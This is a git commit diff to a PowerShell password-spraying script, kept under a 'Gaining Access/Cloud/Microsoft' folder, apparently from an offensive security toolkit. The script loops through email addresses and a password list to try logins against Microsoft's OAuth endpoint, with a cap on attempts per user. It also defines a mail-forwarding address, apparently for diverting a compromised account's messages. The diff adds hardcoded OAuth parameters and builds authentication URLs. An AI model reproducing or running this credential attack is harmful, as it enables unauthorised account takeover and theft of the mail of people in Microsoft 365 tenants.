508ff9cea5e3b5aabaf5c52472287ba537bdacf3
41ph4-01 <166868320+4lph4-01@users.noreply.github.com>
2025-01-18 16:13:33 +0000

    Update PasswordSpray-txt-pwd-file-all.ps1
    Overhaul of the initial implementation.

--- Gaining Access/Cloud/Microsoft/PasswordSpray-txt-pwd-file-all.ps1
+++ Gaining Access/Cloud/Microsoft/PasswordSpray-txt-pwd-file-all.ps1
@@ -26,11 +26,38 @@ $maxAttemptsPerUser = 2
 # Specify the email address to forward messages to
 $forwardTo = "forwarding@example.com"
 
+# Define the base OAuth 2.0 authorization URL
+$baseAuthUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+
+# Define the client ID and redirect URI
+$clientId = "4765445b-32c6-49b0-83e6-1d93765276ca"
+$redirectUri = "https://www.office.com/landingv2"
+
+# Define other query parameters
+$responseType = "code id_token"
+$scope = "openid profile https://www.office.com/v2/OfficeHome.All"
+$responseMode = "form_post"
+$nonce = "638728133397784705.ZDg1YTA0NGQtMDdiYi00Zjg0LWFjYmUtMDg4MWY0MzYzZDNlYzc5MzNmYjAtZTRlMS00OTI1LTg3ZjItZDIyMTIyYWE1NjM2"
+$uiLocales = "en-GB"
+$mkt = "en-GB"
+$clientRequestId = "78b116a9-4622-44ef-95b2-9409c13abfdd"
+$state = "c4S5umnqbeOt-Kc107nqz5_mpYXX2C-nM7oZDJBCwzSg4yHd3gdtX5uEEXkvb3pBa7QRhdgmVfHW4mel6v-8-R0h1P5kBAm9L-GgVZZzNchNo1Tgnn-y9i0YyvM1KNrvvaCxqLzWRhajmx7xfLVyjF9hR8uvgF33Xfm9cpotrtMgRlEO-XJOnkrlcgp611AZIe9_4zHnHRvDgprk1arremKdqbRaPxdP4KJcQTgpt7CgjlJiwmoR85Uc_Ub9kbg0zRbTYKMfCbfYdrlMv-yENg3QOL3I43KsgRp-6Sk8nHw"
+$xClientSKU = "ID_NET8_0"
+$xClientVer = "7.5.1.0"
+
 # Loop through each email address (UPN)
 foreach ($emailAddress in $emailAddresses) {
     # Counter for the number of attempts for the current user
     $attempts = 0
     
+    # Extract the domain from the email address
+    $domain = $emailAddress.Split('@')[1]
+
+    # Construct the authentication URL
+    $authUrl = "$baseAuthUrl?client_id=$clientId&redirect_uri=$redirectUri&response_type=$responseType&scope=$scope&response_mode=$responseMode&nonce=$nonce&ui_locales=$uiLocales&mkt=$mkt&client-request-id=$clientRequestId&state=$state&x-client-SKU=$xClientSKU&x-client-ver=$xClientVer"
+    
+    Write-Host "Authentication URL for $emailAddress: $authUrl"
+
     # Loop through each password
     foreach ($password in $passwords) {
         # Attempt login using current email address (UPN) and password
@@ -65,4 +92,3 @@ foreach ($emailAddress in $emailAddresses) {
         }
     }
 }
-
